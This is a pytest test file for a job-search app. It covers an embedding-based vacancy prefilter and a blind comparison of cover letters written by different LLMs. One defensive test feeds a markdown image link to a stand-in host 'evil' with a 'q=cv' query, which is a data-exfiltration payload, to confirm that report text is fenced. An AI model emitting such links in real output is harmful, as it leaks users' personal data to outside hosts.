"""Meaning-based prefilter (embeddings) and the blind cover-letter model comparison."""

from __future__ import annotations

import hashlib
from datetime import timedelta

import httpx
import pytest
from sqlalchemy import select

from app.core.config import EmbeddingSettings, LLMRoute, LLMTarget, ModelPrice, ProviderConfig, SourceConfig
from app.core.db import session_scope, utcnow
from app.llm import BudgetExceeded, LLMError, LLMUnavailable, get_gateway
from app.llm import vectors
from app.llm.base import EmbeddingResponse, LLMInvalidOutput
from app.llm.providers.fake import FakeProvider
from app.models import Analysis, EmbeddingCache, LLMUsage, User, UserVacancy, Vacancy
from app.ranking.prefilter import RankResult
from app.ranking.semantic import blend, cosine, similarity_score
from app.services import model_compare
from app.services import resumes as resume_svc
from app.services import search as search_svc
from app.services import semantic as semantic_svc
from app.services import vacancies as vacancy_svc
from app.services.errors import NotFound, ValidationFailed
from app.sources import registry
from app.sources.base import JobSource, SearchQuery, VacancyDraft

from .conftest import RESUME_TEXT, VACANCY_TEXT
from .test_pipeline import PROFILE


@pytest.fixture
def emb(env):
    env.llm.embeddings = EmbeddingSettings(enabled=True, provider="fake", model="fake-emb", low=0.0, high=0.5)
    return env.llm.embeddings


@pytest.fixture(autouse=True)
def _clean_fake():
    FakeProvider.embedded.clear()


# --------------------------------------------------------------------------- math and storage

def test_vectors_roundtrip_and_unit_length():
    v = vectors.unit([3.0, 4.0])
    assert v == pytest.approx([0.6, 0.8])
    assert vectors.unpack(vectors.pack(v)) == pytest.approx(v, abs=1e-3)
    assert vectors.unit([0.0, 0.0]) == [0.0, 0.0]


def test_similarity_score_and_blend():
    assert similarity_score(0.30, 0.35, 0.75) == 0
    assert similarity_score(0.55, 0.35, 0.75) == pytest.approx(50)
    assert similarity_score(0.90, 0.35, 0.75) == 100
    assert similarity_score(0.5, 0.6, 0.6) == 0  # misconfigured range does not divide by zero
    assert cosine([1.0, 0.0], [0.0, 1.0]) == 0
    assert blend(RankResult(20, ["навыки: Python"]), 80, 0.5).score == 50
    assert blend(RankResult(20, []), None, 0.5).score == 20  # no vector: keywords only
    excluded = RankResult(0, ["стоп-слово"], excluded=True)
    assert blend(excluded, 100, 0.5) is excluded  # hard filters always win


# --------------------------------------------------------------------------- gateway

async def test_embed_caches_by_text_and_records_usage(emb, user_id):
    gw = get_gateway()
    first = await gw.embed(["Python-разработчик", "Бариста", "Python-разработчик"], user_id=user_id)
    assert len(first) == 3 and first[0] == first[2]
    assert sum(x * x for x in first[0]) == pytest.approx(1.0, abs=1e-2)
    assert FakeProvider.embedded == ["Python-разработчик", "Бариста"]  # a repeated text is sent once
    again = await gw.embed(["Бариста"], user_id=user_id)
    assert again[0] == first[1]  # a cache hit scores exactly like the fresh vector
    assert FakeProvider.embedded == ["Python-разработчик", "Бариста"]
    with session_scope() as s:
        usage = s.scalars(select(LLMUsage).where(LLMUsage.task == "embedding")).all()
        assert len(usage) == 1 and usage[0].user_id == user_id and usage[0].input_tokens > 0


async def test_embed_batches_keep_order_and_truncate(emb, user_id):
    emb.batch_size, emb.max_chars = 2, 500
    texts = [f"текст номер {i}" for i in range(5)]
    out = await get_gateway().embed(texts, user_id=user_id)
    with session_scope() as s:
        assert len(s.scalars(select(LLMUsage).where(LLMUsage.task == "embedding")).all()) == 3
    for i, text in enumerate(texts):
        assert (await get_gateway().embed([text], user_id=user_id))[0] == out[i]
    same = await get_gateway().embed(["а" * 500 + "конец1", "а" * 500 + "конец2"], user_id=user_id)
    assert same[0] == same[1] and FakeProvider.embedded[-1] == "а" * 500


async def test_embed_errors_are_llm_errors(env, user_id, monkeypatch):
    with pytest.raises(LLMError, match="выключен"):
        await get_gateway().embed(["x"], user_id=user_id)
    env.llm.embeddings = EmbeddingSettings(enabled=True, provider="nope", model="m")
    with pytest.raises(LLMError):
        await get_gateway().embed(["x"], user_id=user_id)

    class ChatOnly:
        name = "chat"

        async def generate(self, req):
            raise AssertionError

    env.llm.embeddings = EmbeddingSettings(enabled=True, provider="chat", model="m")
    monkeypatch.setattr(get_gateway(), "provider", lambda name: ChatOnly())
    with pytest.raises(LLMError, match="не умеет"):
        await get_gateway().embed(["x"], user_id=user_id)


async def test_wrong_vector_count_is_an_error_and_nothing_is_cached(emb, user_id, monkeypatch):
    async def short(self, model, texts):
        return EmbeddingResponse(vectors=[[1.0, 0.0]], model=model)

    monkeypatch.setattr(FakeProvider, "embed", short)
    with pytest.raises(LLMInvalidOutput):
        await get_gateway().embed(["a", "b"], user_id=user_id)
    with session_scope() as s:
        assert not s.scalars(select(EmbeddingCache)).all()
        assert s.scalars(select(LLMUsage).where(LLMUsage.task == "embedding")).one().ok is False


async def test_partial_mode_skips_only_rejected_texts(emb, user_id, monkeypatch):
    emb.batch_size = 4
    real = FakeProvider.embed

    async def picky(self, model, texts):
        if any("BAD" in t for t in texts):
            raise LLMError("HTTP 400: input too long")
        return await real(self, model, texts)

    monkeypatch.setattr(FakeProvider, "embed", picky)
    texts = ["один", "BAD два", "три", "четыре"]
    with pytest.raises(LLMError):  # strict by default
        await get_gateway().embed(texts, user_id=user_id)
    out = await get_gateway().embed(texts, user_id=user_id, partial=True)
    assert out[1] is None and all(v is not None for i, v in enumerate(out) if i != 1)

    async def down(self, model, texts):
        raise LLMUnavailable("timeout")

    monkeypatch.setattr(FakeProvider, "embed", down)
    with pytest.raises(LLMUnavailable):  # a temporary outage is not "skip the text"
        await get_gateway().embed(["пять"], user_id=user_id, partial=True)


async def test_budget_is_checked_before_each_batch(emb, env, user_id):
    emb.batch_size = 1
    env.llm.prices["fake-emb"] = ModelPrice(input=1e6, output=0)  # any batch spends the whole budget
    with session_scope() as s:
        s.get(User, user_id).monthly_budget_usd = 1.0
    a, b = "альфа " * 10, "бета " * 10
    with pytest.raises(BudgetExceeded):
        await get_gateway().embed([a, b], user_id=user_id)
    assert FakeProvider.embedded == [a]
    assert await get_gateway().embed([a], user_id=user_id)  # cache hits need no budget


async def test_purge_drops_old_vectors(emb, user_id):
    gw = get_gateway()
    await gw.embed(["old", "new"], user_id=user_id)
    with session_scope() as s:
        row = s.scalars(select(EmbeddingCache)).first()
        row.created_at = utcnow() - timedelta(days=emb.keep_days + 1)
    assert gw.purge_embeddings() == 1
    with session_scope() as s:
        assert len(s.scalars(select(EmbeddingCache)).all()) == 1


async def test_openai_compat_embeddings(monkeypatch):
    from app.llm.providers import openai_compat

    seen = {}

    def handler(request):
        seen["path"], seen["auth"], seen["body"] = request.url.path, request.headers.get("authorization"), request.content
        return httpx.Response(200, json={"model": "BAAI/bge-m3", "usage": {"prompt_tokens": 7}, "data": [
            {"index": 1, "embedding": [0.0, 1.0]}, {"index": 0, "embedding": [1.0, 0.0]}]})

    real = httpx.AsyncClient
    monkeypatch.setattr(openai_compat, "make_async_client",
                        lambda **kw: real(transport=httpx.MockTransport(handler), headers=kw.get("headers")))
    monkeypatch.setenv("EMB_TEST_KEY", "k")
    provider = openai_compat.OpenAICompatProvider("p", ProviderConfig(
        type="openai_compat", base_url="http://x/v1", api_key_env="EMB_TEST_KEY"))
    resp = await provider.embed("BAAI/bge-m3", ["a", "b"])
    assert seen["path"] == "/v1/embeddings" and seen["auth"] == "Bearer k"
    assert b'"input":["a","b"]' in seen["body"].replace(b" ", b"")
    assert resp.vectors == [[1.0, 0.0], [0.0, 1.0]]  # ordered by "index", not by position
    assert resp.usage.input_tokens == 7


@pytest.mark.parametrize("body", [
    {}, {"data": None}, {"data": ["x"]}, {"data": [{"index": 0}]}, {"data": [{"index": 0, "embedding": []}]},
    {"data": [{"index": 0, "embedding": ["a"]}]}, {"data": [{"index": 0, "embedding": [float("nan")]}]},
    {"data": [{"index": 0, "embedding": [1.0]}]},  # one vector for two texts
], ids=range(8))
async def test_openai_compat_embeddings_malformed(monkeypatch, body):
    from app.llm.providers import openai_compat

    real = httpx.AsyncClient
    content = httpx.Response(200, json=body).content if "nan" not in str(body) else \
        b'{"data": [{"index": 0, "embedding": [NaN]}, {"index": 1, "embedding": [NaN]}]}'
    monkeypatch.setattr(openai_compat, "make_async_client", lambda **kw: real(
        transport=httpx.MockTransport(lambda r: httpx.Response(200, content=content))))
    provider = openai_compat.OpenAICompatProvider("p", ProviderConfig(type="openai_compat", base_url="http://x"))
    with pytest.raises(LLMInvalidOutput):
        await provider.embed("m", ["a", "b"])


# --------------------------------------------------------------------------- search pipeline

class MeaningSource(JobSource):
    name = "meaning"
    title = "Meaning"

    async def search(self, query: SearchQuery, limit: int) -> list[VacancyDraft]:
        return [
            # No profile skill (Python, FastAPI) and no role word in the title: keywords give 0,
            # but the text is about the same work as the resume.
            VacancyDraft(source="meaning", external_id="1", title="Инженер платформы каталога",
                         description="ООО Ромашка: разработка API на PostgreSQL, Docker, Redis, Kafka; "
                                     "ускорить выдачу каталога в 3 раза, опыт 4 года"),
            VacancyDraft(source="meaning", external_id="2", title="Бариста", description="Кофе и сиропы"),
            VacancyDraft(source="meaning", external_id="3", title="Программист 1С", description="1С ЗУП"),
            VacancyDraft(source="meaning", external_id="4", title="Python-разработчик",
                         description="FastAPI и PostgreSQL"),
        ]


@pytest.fixture
def meaning_search(monkeypatch, env, user_id):
    monkeypatch.setitem(registry.SOURCE_CLASSES, "meaning", MeaningSource)
    monkeypatch.setitem(env.sources, "meaning", SourceConfig())
    FakeProvider.canned["resume_profile"] = PROFILE
    FakeProvider.canned["match_quick"] = {"summary": "подходит", "score": 50, "verdict": "maybe"}
    with session_scope() as s:
        resume_id = resume_svc.create(s, user_id, title="CV", text=RESUME_TEXT).id
        return search_svc.create(s, user_id, resume_id=resume_id, name="", sources=["meaning"],
                                 queries=["python"], filters={}).id


def _scores(user_id):
    with session_scope() as s:
        return {uv.vacancy.title: (uv.prefilter_score, uv.semantic_score)
                for uv in s.scalars(select(UserVacancy).where(UserVacancy.user_id == user_id))}


async def test_keywords_alone_miss_the_vacancy(meaning_search, user_id):
    result = await search_svc.run_search(user_id, meaning_search)
    assert result["llm_match_enqueued"] == 1  # only the keyword hit
    assert _scores(user_id)["Инженер платформы каталога"] == (0.0, None)
    assert FakeProvider.embedded == []  # off: nothing is sent anywhere


async def test_meaning_similarity_brings_it_to_the_llm(meaning_search, user_id, emb):
    keyword_only = _scores(user_id)
    result = await search_svc.run_search(user_id, meaning_search)
    assert result["llm_match_enqueued"] == 2, result  # keyword hit + found by meaning
    scores = _scores(user_id)
    keyword, meaning = scores["Инженер платформы каталога"]
    assert keyword == 0.0 and meaning > 50  # prefilter_score stays keywords-only (auto-apply guard)
    assert scores["Python-разработчик"][0] > 0 and scores["Python-разработчик"][1] is not None
    assert scores["Бариста"][1] < meaning
    assert scores["Программист 1С"][1] is None  # excluded by a stop word: never embedded
    assert not any("1С ЗУП" in t for t in FakeProvider.embedded)
    assert keyword_only == {}

    sent = len(FakeProvider.embedded)
    await search_svc.run_search(user_id, meaning_search)
    assert len(FakeProvider.embedded) == sent  # the same texts are never paid for twice


async def test_stale_meaning_score_is_cleared(meaning_search, user_id, env, emb):
    await search_svc.run_search(user_id, meaning_search)
    assert _scores(user_id)["Инженер платформы каталога"][1] is not None
    env.llm.embeddings = EmbeddingSettings()  # switched off
    await search_svc.run_search(user_id, meaning_search)
    assert all(sem is None for _, sem in _scores(user_id).values())


async def test_embedding_failure_falls_back_to_keywords(meaning_search, user_id, emb, monkeypatch):
    async def down(self, model, texts):
        raise LLMUnavailable("fake: HTTP 503: account 42 over quota")

    monkeypatch.setattr(FakeProvider, "embed", down)
    result = await search_svc.run_search(user_id, meaning_search)
    assert result["llm_match_enqueued"] == 1  # the keyword hit still goes to the LLM
    assert any("по смыслу недоступен" in e for e in result["errors"])
    assert not any("account 42" in e for e in result["errors"])  # provider details stay in the log
    assert all(sem is None for _, sem in _scores(user_id).values())
    with session_scope() as s:
        assert s.scalars(select(LLMUsage).where(LLMUsage.task == "embedding", LLMUsage.ok.is_(False))).all()


async def test_rejected_vacancy_text_does_not_cost_the_others(meaning_search, user_id, emb, monkeypatch):
    real = FakeProvider.embed

    async def picky(self, model, texts):
        if any("Кофе" in t for t in texts):
            raise LLMError("HTTP 400: bad input")
        return await real(self, model, texts)

    monkeypatch.setattr(FakeProvider, "embed", picky)
    result = await search_svc.run_search(user_id, meaning_search)
    scores = _scores(user_id)
    assert scores["Бариста"][1] is None and scores["Инженер платформы каталога"][1] is not None
    assert result["llm_match_enqueued"] == 2


async def test_cap_takes_the_best_keyword_scores_and_skips_closed(meaning_search, user_id, emb):
    emb.max_per_run = 1
    await search_svc.run_search(user_id, meaning_search)
    assert len(FakeProvider.embedded) == 2  # the resume + one vacancy: the best by keywords
    assert "Python-разработчик" in FakeProvider.embedded[1]

    emb.max_per_run = 100
    with session_scope() as s:
        vid = s.scalar(select(Vacancy.id).where(Vacancy.title == "Бариста"))
        vacancy_svc.set_status(s, user_id, vid, "hidden")
    FakeProvider.embedded.clear()
    await search_svc.run_search(user_id, meaning_search)
    assert not any("Кофе" in t for t in FakeProvider.embedded)  # hidden: not worth a vector


def test_resume_query_and_vacancy_text():
    from app.features.resume_profile.schema import ResumeProfile
    from app.services.criteria import SearchCriteria

    profile = ResumeProfile.model_validate({**PROFILE, "adjacent_roles": ["Data Engineer"]})
    assert "Data Engineer" in semantic_svc.resume_query(profile, SearchCriteria(), "CV")
    assert "Data Engineer" not in semantic_svc.resume_query(profile, SearchCriteria(adjacent_roles=False), "CV")
    v = Vacancy(source="s", external_id="1", title="Data Engineer", skills=["Spark"], description="ETL")
    assert semantic_svc.vacancy_text(v) == "Data Engineer\nSpark\nETL"


# --------------------------------------------------------------------------- doctor

async def test_doctor_checks_embeddings(emb, env):
    from app.doctor import check_config, check_llm

    price = next(c for c in check_config() if c.name.startswith("цена эмбеддингов"))
    assert not price.ok  # no [llm.prices] for the model: spending would bypass budgets
    env.llm.prices["fake-emb"] = ModelPrice(input=0.61, output=0)
    assert next(c for c in check_config() if c.name.startswith("цена эмбеддингов")).ok
    check = next(c for c in await check_llm() if c.name.startswith("эмбеддинги"))
    assert check.ok and "размер вектора 64" in check.detail
    env.llm.embeddings = EmbeddingSettings(enabled=True, provider="nope", model="m")
    assert not next(c for c in await check_llm() if c.name.startswith("эмбеддинги")).ok


# --------------------------------------------------------------------------- letters comparison

def _resume_and_vacancies(user_id, n=1):
    with session_scope() as s:
        resume_id = resume_svc.create(s, user_id, title="CV", text=RESUME_TEXT).id
        vids = [vacancy_svc.create_manual(s, user_id, title=f"Python dev {i}", text=VACANCY_TEXT + f" {i}").id
                for i in range(n)]
    return resume_id, vids


def _tagged_letters(monkeypatch):
    """Fake letters that name their model, so the report's labels can be checked against the key."""
    real = FakeProvider.generate

    async def generate(self, req):
        resp = await real(self, req)
        if req.task == "cover_letter":
            resp.data["body"] = "BODY-" + hashlib.md5(req.model.encode()).hexdigest()[:6]
        return resp

    monkeypatch.setattr(FakeProvider, "generate", generate)


async def test_compare_letters_blind_report(user_id, tmp_path, monkeypatch):
    _tagged_letters(monkeypatch)
    resume_id, vids = _resume_and_vacancies(user_id, 2)
    targets = [model_compare.parse_target("fake:model-a"), model_compare.parse_target("fake:model-b")]
    runs = await model_compare.compare_letters(user_id, resume_id, vids + [vids[0]], targets + [targets[0]])
    assert len(runs) == 4 and not any(r.error for r in runs)  # duplicates dropped
    assert sorted(c.model for c in FakeProvider.calls if c.task == "cover_letter") == \
        ["model-a", "model-a", "model-b", "model-b"]  # each model really wrote its letters
    with session_scope() as s:
        assert not s.scalars(select(Analysis).where(Analysis.kind == "cover_letter")).all()  # not saved
        usage = s.scalars(select(LLMUsage).where(LLMUsage.task == "cover_letter")).all()
        assert usage and all(u.user_id is None for u in usage)  # not billed to the user

    out = model_compare.write_report(runs, user_id, resume_id, tmp_path / "r", seed=1)
    blind = (out / "blind.md").read_text(encoding="utf-8")
    key = (out / "key.md").read_text(encoding="utf-8")
    assert "model-a" not in blind and "model-b" not in blind
    rows = {(line.split("|")[1].strip(), line.split("|")[2].strip()): line.split("|")[3].strip()
            for line in key.splitlines() if line.startswith("| ") and line.split("|")[2].strip() in "AB"}
    for n, section in enumerate(blind.split("## Вакансия ")[1:], 1):
        for label in "AB":
            body = section.split(f"### Письмо {label}")[1][:400]
            model = rows[(str(n), label)].split(":", 1)[1]
            assert "BODY-" + hashlib.md5(model.encode()).hexdigest()[:6] in body
    assert "Иван Петров" in (out / "inputs.md").read_text(encoding="utf-8")

    again = await model_compare.compare_letters(user_id, resume_id, vids[:1], targets[:1])
    assert again[0].input_tokens > 0  # the LLM cache is bypassed: real cost and time are measured


async def test_compare_letters_keeps_effort_only_for_the_configured_model(user_id, env):
    env.llm.routes["cover_letter"] = LLMRoute(provider="fake", model="model-a", effort="high", max_tokens=1234,
                                             fallbacks=[LLMTarget(provider="fake", model="fallback")])
    resume_id, vids = _resume_and_vacancies(user_id)
    await model_compare.compare_letters(user_id, resume_id, vids, [model_compare.parse_target("fake:model-a"),
                                                                   model_compare.parse_target("fake:model-b")])
    calls = {c.model: c for c in FakeProvider.calls if c.task == "cover_letter"}
    assert set(calls) == {"model-a", "model-b"}  # never the fallback
    assert (calls["model-a"].effort, calls["model-a"].max_tokens) == ("high", 1234)
    assert calls["model-b"].effort is None and calls["model-b"].max_tokens != 1234


async def test_compare_letters_validation_happens_before_paying(user_id):
    with pytest.raises(ValidationFailed):
        model_compare.parse_target("GigaChat-3-Pro")  # no provider
    assert model_compare.parse_target("cloudru:a/b:c").model == "a/b:c"
    resume_id, vids = _resume_and_vacancies(user_id)
    fake = [model_compare.parse_target("fake:m")]
    with pytest.raises(ValidationFailed, match="не описан"):
        await model_compare.compare_letters(user_id, resume_id, vids, [model_compare.parse_target("nope:m")])
    with pytest.raises(ValidationFailed):
        await model_compare.compare_letters(user_id, resume_id, [], fake)
    with pytest.raises(ValidationFailed):
        await model_compare.compare_letters(user_id, resume_id, list(range(1, 12)), fake)
    with session_scope() as s:
        bob = User(username="bob", password_hash="x")
        s.add(bob)
        s.flush()
        foreign = vacancy_svc.create_manual(s, bob.id, title="Чужая", text=VACANCY_TEXT).id
    with pytest.raises(NotFound):  # someone else's vacancy as the last id: nothing is written first
        await model_compare.compare_letters(user_id, resume_id, vids + [foreign], fake)
    assert not [c for c in FakeProvider.calls if c.task == "cover_letter"]


async def test_compare_letters_reports_model_errors(user_id, monkeypatch, tmp_path):
    async def broken(self, req):
        raise LLMError("HTTP 404: model|not found")

    monkeypatch.setattr(FakeProvider, "generate", broken)
    resume_id, vids = _resume_and_vacancies(user_id)
    runs = await model_compare.compare_letters(user_id, resume_id, vids, [model_compare.parse_target("fake:x")])
    assert runs[0].error.startswith("HTTP 404")
    out = model_compare.write_report(runs, user_id, resume_id, tmp_path / "r")
    assert "модель не ответила" in (out / "blind.md").read_text(encoding="utf-8")
    key = (out / "key.md").read_text(encoding="utf-8")
    assert "model/not found" in key and "| fake:x | 0 | 1 |" in key


def test_report_text_cannot_render_as_markdown():
    lines = model_compare._fenced("Привет ![](https://evil/?q=cv) ```")
    assert lines[0] == "````text" and lines[-1] == "````"


def test_cli_compare_letters(user_id, env, tmp_path, monkeypatch, capsys):
    from app import cli

    env.data_dir = str(tmp_path)
    monkeypatch.setattr(cli, "_migrate", lambda: None)
    resume_id, vids = _resume_and_vacancies(user_id)
    with pytest.raises(SystemExit):
        cli.main(["compare-letters", "alice"])
    assert f"{vids[0]}: Python dev 0" in capsys.readouterr().out
    cli.main(["compare-letters", "alice", "--resume", str(resume_id), "--vacancy", str(vids[0]),
              "--model", "fake:a", "--out", "my-test"])
    assert (tmp_path / "my-test" / "blind.md").exists()  # a relative --out stays inside data_dir
    with pytest.raises(SystemExit, match="Не получилось"):
        cli.main(["compare-letters", "alice", "--resume", str(resume_id), "--vacancy", str(vids[0]),
                  "--model", "nope:m"])
